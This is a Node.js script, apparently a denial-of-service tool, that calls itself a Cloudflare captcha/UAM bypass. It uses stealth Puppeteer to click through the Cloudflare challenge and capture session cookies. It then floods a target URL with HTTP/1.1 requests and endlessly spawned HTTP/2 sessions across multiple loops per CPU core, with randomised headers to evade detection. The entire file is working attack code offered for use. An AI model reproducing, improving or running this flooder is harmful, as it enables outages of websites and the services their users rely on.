const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const http2 = require('http2');
const os = require('os');
const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];
const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];
const encoding_header = [
  '*',
  'gzip, deflate',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
];
const language_header = [
  'en-GB,en;q=0.7',
  'en-GB-oxendict,en;q=0.9,pl-PL;q=0.8,pl;q=0.7',
];
const dest_header = [
  'audio',
  'audioworklet',
  'document',
  'embed',
  'empty',
  'font',
  'frame',
  'iframe',
  'image',
  'manifest',
  'object',
  'paintworklet',
  'report',
  'script',
  'serviceworker',
  'sharedworker',
  'style',
  'track',
  'video',
  'worker',
  'xslt'
];
const mode_header = [
  'cors',
  'navigate',
  'no-cors',
  'same-origin',
  'websocket'
];
const site_header = [
  'cross-site',
  'same-origin',
  'same-site',
  'none'
];
const sec_ch_ua = [
  '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
  '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"'
];

const args = process.argv.slice(2);
if (args.length < 2) {
  return console.log(`Browser V1.0.0 (Bypass Cloudflare Captcha / UAM)
  
Usage: node Browser.js [url] [time]
--proxy proxy.txt if you using proxy file to start Browser`);
}

const target = args[0];
const time = parseInt(args[1], 10);

async function visitPage(originalUrl) {
  const browser = await puppeteer.launch({
  headless: true,
  args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--start-maximized',
      '--disable-infobars',
      '--disable-web-security',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const page = await browser.newPage();
  const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0',
];
const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
  
  await page.setUserAgent(userAgent);
await page.setViewport({ width: 1280, height: 800 });

console.log(`[!] Navigating to URL: ${originalUrl}`);

try {
  // Ganti waitUntil menjadi 'domcontentloaded' untuk mempercepat pemuatan
  await page.goto(originalUrl, { waitUntil: 'domcontentloaded' });

  const isCFProtect = await page.evaluate(() => {
    const titleText = document.title.toLowerCase();
    return titleText.includes("just a moment");
  });

  if (isCFProtect) {
    console.log("[-] Detected CF Protection - Initiating bypass");
    const clickX = 219;
    const clickY = 279;

    const intervalId = setInterval(async () => {
      const stillProtected = await page.evaluate(() => {
        const titleText = document.title.toLowerCase();
        return titleText.includes("just a moment");
      });

      if (stillProtected) {
        await page.mouse.click(clickX, clickY);
        console.log("[+] Attempted bypass click...");
      } else {
        console.log("[+] Cloudflare Successfully Bypassed");

        // Ambil cookies segera setelah proteksi berhasil dilewati
        const cookies = await page.cookies();
        const cookieHeader = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        console.log(`[+] Cookies: ${cookieHeader}`);
        console.log(`[+] User-Agent: ${userAgent}`);
        clearInterval(intervalId); // Berhenti klik setelah berhasil bypass
        console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
        flood(target, userAgent, cookieHeader, time);
      }
    }, 2000); // Mengurangi interval ke 2000ms (lebih cepat dari sebelumnya)
  } else {
    console.log("[+] No CF Protection detected - Proceeding normally");
    console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
    flood(target, userAgent, "", time);
  }

} catch (error) {
  console.error('An error occurred:', error);
}
}

// Fungsi untuk memilih elemen acak dari array
function randomElement(elements) {
  return elements[Math.floor(Math.random() * elements.length)];
}

// Fungsi untuk mengirim permintaan HTTP/1.1
async function sendHttp1Request(url, userAgent, cookieHeader) {
  try {
    await axios.get(url, {
      headers: {
        "User-Agent": userAgent,
        "Cookie": cookieHeader,
        "Accept": randomElement([
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "application/json, text/plain, */*",
        ]),
        "Cache-Control": "no-store, max-age=0",
        "Accept-Encoding": randomElement(["gzip, deflate, br", "identity"]),
        "Accept-Language": randomElement(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-CH-UA": '"Chromium";v="91", "Google Chrome";v="91"'
      },
      // Tambahkan dummy data untuk meningkatkan payload
      data: { dummyData: "A".repeat(1000) } 
    });
  } catch (error) {
    // Silent error
  }
}

// Fungsi untuk membuat sesi HTTP/2 baru tanpa menutup permintaan
function createHttp2Session(url, userAgent, cookieHeader) {
  const client = http2.connect(url, { rejectUnauthorized: false });

  client.on('error', (err) => {
    console.error(`HTTP/2 connection error: ${err.message}`);
  });

  function sendHttp2Request() {
    const req = client.request({
      ":method": "GET",
      ":path": "/",
      "user-agent": userAgent,
      "cookie": cookieHeader,
      "accept": randomElement([
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*"
      ]),
      "cache-control": "no-store, max-age=0",
      "accept-encoding": randomElement(["gzip, deflate, br", "identity"]),
      "accept-language": randomElement(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-origin",
      "sec-ch-ua": '"Chromium";v="91", "Google Chrome";v="91"'
    });

    req.on('error', (err) => {
      console.error(`HTTP/2 request error: ${err.message}`);
    });

    req.on('response', (headers) => {
      // Optional: handle response headers if needed
    });

    req.on('data', () => {
      // Optional: handle data chunks if needed
    });

    req.on('end', () => req.close());
    req.end();
  }

  // Kirim permintaan HTTP/2 setiap 50 ms (atau sesuai kebutuhan)
  const interval = setInterval(() => {
    if (!client.closed && !client.destroyed) {
      sendHttp2Request();
    }
  }, 50);

  return client;
}

// Fungsi utama flooder
async function flood(url, userAgent, cookieHeader, time) {
  const endTime = Date.now() + time * 1000;
  const cpuCount = os.cpus().length;

  for (let i = 0; i < cpuCount * 2; i++) {  // Gandakan loop pada CPU count
    (function requestLoop() {
      if (Date.now() >= endTime) {
        console.log(`[+] Flood completed for core ${i + 1}`);
        return;
      }

      sendHttp1Request(url, userAgent, cookieHeader);
      createHttp2Session(url, userAgent, cookieHeader);
      setImmediate(requestLoop);
    })();
  }

  console.log(`[+] Flood started on ${cpuCount * 2} cores for ${time} seconds`);
}

// Mulai flood setelah bypass dan menerima cookie dari target
visitPage(target);

// Mengakhiri proses setelah waktu yang ditentukan
setTimeout(() => {
  console.log(`[+] Time is up! Stopping the flood after ${time} seconds.`);
  process.exit(0); // Mengakhiri proses
}, time * 1000); // Konversi dari detik ke milidetik